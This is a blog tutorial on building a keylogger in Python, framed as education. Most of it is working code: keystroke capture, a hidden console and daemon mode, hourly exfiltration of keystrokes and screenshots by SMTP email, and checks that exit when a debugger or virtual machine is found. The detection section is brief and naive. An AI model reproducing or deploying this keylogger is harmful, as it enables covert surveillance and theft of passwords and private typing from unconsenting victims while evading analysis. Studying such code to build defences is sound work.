---
title: "Building a Keylogger in Python"
date: "2024-01-12"
category: "Malware Analysis"
tags: ["python", "tools", "malware"]
excerpt: "Educational tutorial on creating a keylogger using Python. Learn how these tools work to better defend against them in cybersecurity."
---

# Building a Keylogger in Python

**Disclaimer**: This tutorial is for educational purposes only. Understanding how keyloggers work helps security professionals better defend against them. Only use this knowledge in authorized environments.

## What is a Keylogger?

A keylogger is software that records keystrokes made by a user. While often associated with malicious activities, keyloggers have legitimate uses in:

- Parental monitoring
- Employee productivity tracking
- Personal backup of typed content
- Security research and testing

## Basic Keylogger Implementation

### Required Libraries
```python
import pynput
import logging
import os
import smtplib
from email.mime.text import MIMEText
from datetime import datetime
```

### Simple Keylogger
```python
from pynput import keyboard
import logging

# Configure logging
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(message)s')

def on_press(key):
    try:
        # Log alphanumeric keys
        logging.info(f'{key.char}')
    except AttributeError:
        # Log special keys
        if key == keyboard.Key.space:
            logging.info(' ')
        elif key == keyboard.Key.enter:
            logging.info('\n')
        elif key == keyboard.Key.backspace:
            logging.info('[BACKSPACE]')
        else:
            logging.info(f'[{key}]')

def on_release(key):
    # Stop listener on ESC
    if key == keyboard.Key.esc:
        return False

# Start listening
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```

## Advanced Features

### Stealth Mode
```python
import os
import sys
import ctypes

def hide_console():
    """Hide console window on Windows"""
    if os.name == 'nt':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def run_as_service():
    """Run keylogger as background service"""
    if os.name == 'posix':
        # Unix/Linux daemon
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    
    hide_console()
```

### Email Reporting
```python
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class EmailReporter:
    def __init__(self, email, password, smtp_server="smtp.gmail.com", port=587):
        self.email = email
        self.password = password
        self.smtp_server = smtp_server
        self.port = port
    
    def send_log(self, log_content):
        try:
            msg = MIMEMultipart()
            msg['From'] = self.email
            msg['To'] = self.email
            msg['Subject'] = f"Keylog Report - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
            
            msg.attach(MIMEText(log_content, 'plain'))
            
            server = smtplib.SMTP(self.smtp_server, self.port)
            server.starttls()
            server.login(self.email, self.password)
            server.send_message(msg)
            server.quit()
            
        except Exception as e:
            logging.error(f"Email send failed: {e}")
```

### Screenshot Capture
```python
import pyautogui
from PIL import Image
import io
import base64

class ScreenCapture:
    def __init__(self):
        self.screenshot_interval = 300  # 5 minutes
    
    def capture_screen(self):
        try:
            screenshot = pyautogui.screenshot()
            
            # Compress image
            buffer = io.BytesIO()
            screenshot.save(buffer, format='JPEG', quality=50)
            
            # Encode to base64
            img_data = base64.b64encode(buffer.getvalue()).decode()
            
            return img_data
        except Exception as e:
            logging.error(f"Screenshot failed: {e}")
            return None
```

### Advanced Keylogger Class
```python
import threading
import time
from datetime import datetime, timedelta

class AdvancedKeylogger:
    def __init__(self, log_file="keylog.txt", email_interval=3600):
        self.log_file = log_file
        self.email_interval = email_interval
        self.last_email = datetime.now()
        self.buffer = []
        self.running = False
        
        # Initialize components
        self.email_reporter = EmailReporter("your_email@gmail.com", "your_password")
        self.screen_capture = ScreenCapture()
    
    def on_press(self, key):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        try:
            key_data = f"[{timestamp}] {key.char}"
        except AttributeError:
            if key == keyboard.Key.space:
                key_data = f"[{timestamp}] [SPACE]"
            elif key == keyboard.Key.enter:
                key_data = f"[{timestamp}] [ENTER]"
            else:
                key_data = f"[{timestamp}] [{key}]"
        
        # Add to buffer
        self.buffer.append(key_data)
        
        # Write to file
        with open(self.log_file, "a") as f:
            f.write(key_data + "\n")
        
        # Check if email should be sent
        if datetime.now() - self.last_email > timedelta(seconds=self.email_interval):
            self.send_email_report()
    
    def send_email_report(self):
        if self.buffer:
            log_content = "\n".join(self.buffer)
            
            # Add screenshot
            screenshot = self.screen_capture.capture_screen()
            if screenshot:
                log_content += f"\n\nScreenshot: {screenshot[:100]}..."
            
            self.email_reporter.send_log(log_content)
            self.buffer.clear()
            self.last_email = datetime.now()
    
    def start(self):
        self.running = True
        hide_console()
        
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()
```

## Detection and Prevention

### How to Detect Keyloggers
```python
import psutil
import os

def detect_suspicious_processes():
    """Detect potential keylogger processes"""
    suspicious_names = ['keylog', 'logger', 'capture', 'monitor']
    
    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            proc_name = proc.info['name'].lower()
            for suspicious in suspicious_names:
                if suspicious in proc_name:
                    print(f"Suspicious process: {proc.info}")
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass

def check_network_connections():
    """Monitor unusual network activity"""
    connections = psutil.net_connections()
    for conn in connections:
        if conn.status == 'ESTABLISHED':
            print(f"Active connection: {conn}")
```

### Prevention Techniques
- Use virtual keyboards for sensitive input
- Enable two-factor authentication
- Regular system scans with antivirus
- Monitor running processes
- Use encrypted communication channels

## Legal and Ethical Considerations

### Legal Uses
- Personal device monitoring (with consent)
- Corporate security (with employee notification)
- Parental controls
- Security research in controlled environments

### Illegal Uses
- Unauthorized monitoring of others
- Stealing credentials or personal information
- Corporate espionage
- Identity theft

## Defensive Programming

### Anti-Analysis Techniques
```python
import sys
import os

def check_debugger():
    """Basic debugger detection"""
    if sys.gettrace() is not None:
        sys.exit("Debugger detected")

def check_vm():
    """Basic VM detection"""
    vm_indicators = [
        "VMware", "VirtualBox", "QEMU", "Xen"
    ]
    
    try:
        with open("/proc/version", "r") as f:
            version = f.read()
            for indicator in vm_indicators:
                if indicator.lower() in version.lower():
                    sys.exit("VM detected")
    except:
        pass
```

## Conclusion

Understanding keylogger implementation helps security professionals:

- Recognize keylogger behavior patterns
- Develop better detection mechanisms
- Educate users about threats
- Implement appropriate countermeasures

Remember: Knowledge is power, but with power comes responsibility. Always use these techniques ethically and legally.

## Resources

- [pynput documentation](https://pynput.readthedocs.io/)
- [Python security best practices](https://python.org/dev/security/)
- [OWASP security guidelines](https://owasp.org/)

*Stay curious, stay ethical, and keep learning!*